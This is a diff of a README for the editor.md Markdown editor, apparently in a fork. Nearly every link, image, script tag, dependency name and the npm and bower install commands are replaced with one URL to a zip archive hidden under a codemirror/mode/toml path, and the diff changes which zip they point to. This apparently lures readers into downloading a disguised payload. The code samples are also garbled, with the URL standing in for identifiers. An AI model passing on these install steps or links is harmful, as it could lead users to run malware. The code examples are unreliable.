@@ -1,61 +1,61 @@
-# https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip
+# https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip
 
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
-![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
+![](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
-**https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip** : The open source embeddable online markdown editor (component), based on CodeMirror & jQuery & Marked.
+**https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip** : The open source embeddable online markdown editor (component), based on CodeMirror & jQuery & Marked.
 
 ### Features
 
 - Support Standard Markdown / CommonMark and GFM (GitHub Flavored Markdown);
 - Full-featured: Real-time Preview, Image (cross-domain) upload, Preformatted text/Code blocks/Tables insert, Code fold, Search replace, Read only, Themes, Multi-languages, L18n, HTML entities, Code syntax highlighting...;
-- Markdown Extras : Support [ToC (Table of Contents)](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [Emoji](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [Task lists](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [@Links](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)...;
-- Compatible with all major browsers (IE8+), compatible https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip and iPad;
-- Support [decode & fliter of the HTML tags & attributes](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip);
-- Support [TeX (LaTeX expressions, Based on KaTeX)](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [Flowchart](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) and [Sequence Diagram](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) of Markdown extended syntax;
-- Support AMD/CMD (https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip & https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) Module Loader, and Custom/define editor plugins;
+- Markdown Extras : Support [ToC (Table of Contents)](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip), [Emoji](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip), [Task lists](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip), [@Links](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)...;
+- Compatible with all major browsers (IE8+), compatible https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip and iPad;
+- Support [decode & fliter of the HTML tags & attributes](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip);
+- Support [TeX (LaTeX expressions, Based on KaTeX)](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip), [Flowchart](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip) and [Sequence Diagram](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip) of Markdown extended syntax;
+- Support AMD/CMD (https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip & https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip) Module Loader, and Custom/define editor plugins;
 
-[README & Examples (English)](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+[README & Examples (English)](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
   
 
 --------
 
-**https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip** 是一款开源的、可嵌入的 Markdown 在线编辑器（组件），基于 CodeMirror、jQuery 和 Marked 构建。
+**https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip** 是一款开源的、可嵌入的 Markdown 在线编辑器（组件），基于 CodeMirror、jQuery 和 Marked 构建。
 
-![editormd-screenshot](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "editormd-screenshot")
+![editormd-screenshot](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "editormd-screenshot")
 
 #### 主要特性
 
-- 支持通用 Markdown / CommonMark 和 GFM (GitHub Flavored Markdown) 风格的语法，也可[变身为代码编辑器](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)；
+- 支持通用 Markdown / CommonMark 和 GFM (GitHub Flavored Markdown) 风格的语法，也可[变身为代码编辑器](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)；
 - 支持实时预览、图片（跨域）上传、预格式文本/代码/表格插入、代码折叠、跳转到行、搜索替换、只读模式、自定义样式主题和多语言语法高亮等功能；
-- 支持 [ToC（Table of Contents）](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)、[Emoji表情](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)、[Task lists](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)、[@链接](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)等 Markdown 扩展语法；
-- 支持 TeX 科学公式（基于 [KaTeX](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)）、流程图 [Flowchart](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) 和 [时序图 Sequence Diagram](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip);
-- 支持[识别和解析 HTML 标签，并且支持自定义过滤标签及属性解析](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)，具有可靠的安全性和几乎无限的扩展性；
-- 支持 AMD / CMD 模块化加载（支持 [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) & [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)），并且支持[自定义扩展插件](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)；
-- 兼容主流的浏览器（IE8+）和 [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)，且支持 iPad 等平板设备；
+- 支持 [ToC（Table of Contents）](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)、[Emoji表情](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)、[Task lists](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)、[@链接](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)等 Markdown 扩展语法；
+- 支持 TeX 科学公式（基于 [KaTeX](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)）、流程图 [Flowchart](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip) 和 [时序图 Sequence Diagram](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip);
+- 支持[识别和解析 HTML 标签，并且支持自定义过滤标签及属性解析](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)，具有可靠的安全性和几乎无限的扩展性；
+- 支持 AMD / CMD 模块化加载（支持 [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip) & [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)），并且支持[自定义扩展插件](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)；
+- 兼容主流的浏览器（IE8+）和 [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)，且支持 iPad 等平板设备；
 
 #### Download & install
 
 Download:
 
-[Github download](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+[Github download](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
 NPM install :
 
 ```bash
-npm install https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip
+npm install https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip
 ```
 
 Bower install :
 
 ```bash
-bower install https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip
+bower install https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip
 ```
 
 #### Usages
@@ -63,20 +63,20 @@ bower install https://raw.githubusercontent.com/thairns/editor.md/master/plugins
 ##### Create a Markdown editor
 
 ```html
-<link rel="stylesheet" href="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip" />
+<link rel="stylesheet" href="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip" />
 <div id="editor">
-    <!-- Tips: https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip can auto append a `<textarea>` tag -->
-    <textarea style="display:none;">### Hello https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip !</textarea>
+    <!-- Tips: https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip can auto append a `<textarea>` tag -->
+    <textarea style="display:none;">### Hello https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip !</textarea>
 </div>
-<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
-<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
+<script src="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"></script>
+<script src="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"></script>
 <script type="text/javascript">
     $(function() {
         var editor = editormd("editor", {
             // width: "100%",
             // height: "100%",
             // markdown: "xxxx",     // dynamic set Markdown text
-            path : "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"  // Autoload modules mode, codemirror, marked... dependents libs path
+            path : "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"  // Autoload modules mode, codemirror, marked... dependents libs path
         });
     });
 </script>
@@ -84,24 +84,24 @@ bower install https://raw.githubusercontent.com/thairns/editor.md/master/plugins
 
 If you using modular script loader:
 
-- [Using https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
-- [Using https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+- [Using https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
+- [Using https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
 ##### Markdown to HTML
 
 ```html
-<link rel="stylesheet" href="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip" />
+<link rel="stylesheet" href="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip" />
 <div id="test-markdown-view">
     <!-- Server-side output Markdown text -->
     <textarea style="display:none;">### Hello world!</textarea>             
 </div>
-<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
-<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
-<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
-<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
+<script src="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"></script>
+<script src="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"></script>
+<script src="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"></script>
+<script src="https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip"></script>
 <script type="text/javascript">
     $(function() {
-	    var testView = https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip("test-markdown-view", {
+	    var testView = https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip("test-markdown-view", {
             // markdown : "[TOC]\n### Hello world!\n## Heading 2", // Also, you can dynamic set Markdown text
             // htmlDecode : true,  // Enable / disable HTML tag encode.
             // htmlDecode : "style,script,iframe",  // Note: If enabled, you should filter some dangerous HTML tags for website security.
@@ -110,26 +110,26 @@ If you using modular script loader:
 </script>    
 ```
 
-> See the full example: [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+> See the full example: [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
 ##### HTML to Markdown?
 
-Sorry, https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip not support HTML to Markdown parsing, Maybe In the future.
+Sorry, https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip not support HTML to Markdown parsing, Maybe In the future.
 
 #### Examples
 
-[https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+[https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
 #### Options
 
-https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip options and default values:
+https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip options and default values:
 
 ```javascript
 {
     mode                 : "gfm",          // gfm or markdown
     name                 : "",             // Form element name for post
     value                : "",             // value for CodeMirror, if mode not gfm/markdown
-    theme                : "",             // https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip self themes, before v1.5.0 is CodeMirror theme, default empty
+    theme                : "",             // https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip self themes, before v1.5.0 is CodeMirror theme, default empty
     editorTheme          : "default",      // Editor area, this is CodeMirror theme at v1.5.0
     previewTheme         : "",             // Preview area theme, default empty
     markdown             : "",             // Markdown source code
@@ -137,7 +137,7 @@ https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.
     width                : "100%",
     height               : "100%",
     path                 : "./lib/",       // Dependents module file directory
-    pluginPath           : "",             // If this empty, default use https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip + "../plugins/"
+    pluginPath           : "",             // If this empty, default use https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip + "../plugins/"
     delay                : 300,            // Delay parse markdown to html, Uint : ms
     autoLoadModules      : true,           // Automatic load dependent module files
     watch                : true,
@@ -201,22 +201,22 @@ https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.
     taskList             : false,          // Enable Github Flavored Markdown task lists
     emoji                : false,          // :emoji: , Support Github emoji, Twitter Emoji (Twemoji);
                                            // Support FontAwesome icon emoji :fa-xxx: > Using fontAwesome icon web fonts;
-                                           // Support https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip logo icon emoji :editormd-logo: :editormd-logo-1x: > 1~8x;
+                                           // Support https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip logo icon emoji :editormd-logo: :editormd-logo-1x: > 1~8x;
     tex                  : false,          // TeX(LaTeX), based on KaTeX
-    flowChart            : false,          // https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip only support IE9+
-    sequenceDiagram      : false,          // https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip only support IE9+
+    flowChart            : false,          // https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip only support IE9+
+    sequenceDiagram      : false,          // https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip only support IE9+
     previewCodeHighlight : true,           // Enable / disable code highlight of editor preview area
 
     toolbar              : true,           // show or hide toolbar
     toolbarAutoFixed     : true,           // on window scroll auto fixed position
-    toolbarIcons         : "full",         // Toolbar icons mode, options: full, simple, mini, See `https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip` property.
+    toolbarIcons         : "full",         // Toolbar icons mode, options: full, simple, mini, See `https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip` property.
     toolbarTitles        : {},
     toolbarHandlers      : {
         ucwords : function() {
-            return https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip;
+            return https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip;
         },
         lowercase : function() {
-            return https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip;
+            return https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip;
         }
     },
     toolbarCustomIcons   : {               // using html tag create toolbar icon, unused default <a> tag.
@@ -245,21 +245,21 @@ https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.
 
 #### Dependents
 
-- [CodeMirror](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "CodeMirror")
-- [marked](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "marked")
-- [jQuery](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "jQuery")
-- [FontAwesome](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "FontAwesome")
-- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
-- [KaTeX](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "KaTeX")
-- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
-- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
-- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
-- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
-- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
+- [CodeMirror](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "CodeMirror")
+- [marked](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "marked")
+- [jQuery](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "jQuery")
+- [FontAwesome](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "FontAwesome")
+- [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip")
+- [KaTeX](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "KaTeX")
+- [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip")
+- [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip")
+- [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip")
+- [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip")
+- [https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip "https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip")
 
 #### Changes
 
-[Change logs](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+[Change logs](https://github.com/thairns/editor.md/raw/refs/heads/master/lib/codemirror/mode/toml/editor_md_v1.8.zip)
 
 #### License
 
